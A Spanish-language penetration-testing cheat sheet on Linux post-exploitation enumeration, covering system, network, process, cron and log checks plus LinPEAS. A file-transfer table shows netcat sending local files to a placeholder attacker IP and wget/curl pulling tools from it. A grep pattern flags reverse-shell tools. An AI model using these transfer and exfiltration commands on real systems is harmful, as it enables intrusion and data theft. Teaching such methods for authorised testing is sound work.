# 🗃️ Cheatsheet: Enumeración Post-Explotación en Linux

Esta guía metodológica cubre las áreas críticas de un sistema Linux comprometido, enfocada en la recolección de información para la **Escalada de Privilegios** y el **Movimiento Lateral**.

---

## 1. Información del Sistema y Entorno

### 1.1 Identidad y Contexto
Comandos esenciales para definir el entorno del usuario actual (`whoami`) y los detalles del sistema operativo (SO).

| Objetivo | Comando(s) |
| :--- | :--- |
| **Distribución, Kernel y Arquitectura** | `uname -a` <br> `cat /etc/os-release` |
| **Identidad y Grupos** | `whoami` <br> `id` <br> `groups` |
| **Tiempo y Directorio** | `date` <br> `pwd` |
| **Privilegios de Sudo** | `sudo -l` (Buscar **(ALL) NOPASSWD:**) |

### 1.2 Estructura del Sistema de Archivos
Revisión de la jerarquía, permisos y montajes para identificar ubicaciones inusuales o accesibles.

| Objetivo | Comando(s) |
| :--- | :--- |
| **Uso de Disco y Mounts** | `df -h` <br> `mount` |
| **Permisos en Directorios** | `ls -al` (Directorio actual) |
| **Paquetes Instalados** | `dpkg -l` (Debian/Ubuntu) <br> `rpm -qa` (RHEL/CentOS) |

---

## 2. Red y Servicios Activos

La enumeración de la red es crucial para detectar servicios locales que no son visibles desde el exterior, lo que a menudo revela vectores de escalada interna.

| Objetivo | Comando(s) |
| :--- | :--- |
| **Interfaces y Direcciones IP** | `ip a` (o `ifconfig`) |
| **Puertos Escuchando (PID/Programa)** | `ss -tuln` <br> `netstat -tulpen` <br> `lsof -i -Pn` |
| **Conexiones Remotas Establecidas** | `ss -tnp \| grep ESTAB` (Útil para rastrear *reverse shells* o conexiones activas) |
| **Servicios Systemd Activos** | `systemctl list-units --type=service --state=running` |
| **Detalles del Servicio** | `systemctl status nombre.service` |

---

## 3. Procesos y Tareas Programadas

El análisis de procesos puede exponer tareas que se ejecutan como `root` o scripts que manejan datos sensibles.

### 3.1 Procesos en Ejecución
| Objetivo | Comando(s) |
| :--- | :--- |
| **Listado Jerárquico** | `ps auxwwf` <br> `pstree -pau` |
| **Procesos Sospechosos** | `ps aux \| grep -E 'nc\|ncat\|bash -i\|socat\|fsockopen'` (Buscar *shells* o transferencias) |
| **Archivos Abiertos por PID** | `lsof -p <PID>` (Útil para revisar procesos **php-fpm** o web) |
| **Procesos con Capacidades** | `for pid in $(ps -e -o pid=); do caps=$(grep -s CapEff /proc/$pid/status 2>/dev/null); [ -n "$caps" ] && printf "PID %s: %s\n" "$pid" "$caps"; done` |

---

### 3.2 Tareas Programadas (Cron/Systemd Timers)
| Objetivo | Comando(s) |
| :--- | :--- |
| **Crontab del Usuario Actual** | `crontab -l 2>/dev/null` |
| **Crontabs Globales/Directos** | `ls -l /etc/cron.* /etc/cron.d /var/spool/cron/crontabs 2>/dev/null` |
| **Scripts Comunes (Escalada)** | `grep -R --line-number -E "clean-web\|start-crushftp\|linpeas\|reverse" /root /etc /var/www 2>/dev/null` |
| **Systemd Timers** | `systemctl list-timers --all` |

---

## 4. Archivos Clave y Logs

La búsqueda de credenciales *hardcoded* o archivos de configuración sensibles es una prioridad.

### 4.1 Ficheros de Logs y Usuarios
| Objetivo | Comando(s) |
| :--- | :--- |
| **Cuentas Locales** | `cat /etc/passwd` |
| **Usuarios Conectados** | `w` (o `who`) |
| **Revisión de Logs** | `tail -n 200 /var/log/auth.log` <br> `ls -l /var/log` (Buscar actividad reciente o nombres inusuales) |

---

### 4.2 Transferencia de Archivos
Herramientas básicas para mover *exploits*, *shells* o herramientas de enumeración (como LinPEAS) hacia y desde el objetivo.

| Método | Comando de Descarga (Cliente) | Comando de Servidor Simple (Atacante) |
| :--- | :--- | :--- |
| **HTTP (Wget)** | `wget http://<IP_ATACANTE>:8080/file` | `python3 -m http.server 8080` |
| **HTTP (cURL)** | `curl http://<IP_ATACANTE>:8080/file -o file` | `python3 -m http.server 8080` |
| **Netcat** | `nc <IP_ATACANTE> 4444 < file_local` | `nc -lvnp 4444 > file_recibido` |
| **SSH** | `scp user@<IP_ATACANTE>:/path/file .` | *Requiere credenciales SSH* |

---

## 5. Automatización: LinPEAS (PEASS-NG)

**LinPEAS** es la herramienta estándar de enumeración post-explotación. Automatiza la recolección y análisis heurístico, buscando binarios SUID/SGID, credenciales, permisos inseguros y vectores de *kernel exploit* conocidos.

### 5.1 Ejecución
El método preferido es transferir y ejecutar el script.

```bash
# Descarga y ejecución (usando curl)
curl -sSfL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Guardar salida para análisis
./linpeas.sh 2>&1 | tee linpeas-output.txt
```

> **NOTA:** Ejecuta **LinPEAS** como el usuario con menos privilegios que has obtenido para que los resultados reflejen exactamente los vectores de escalada *accesibles* desde ese contexto.
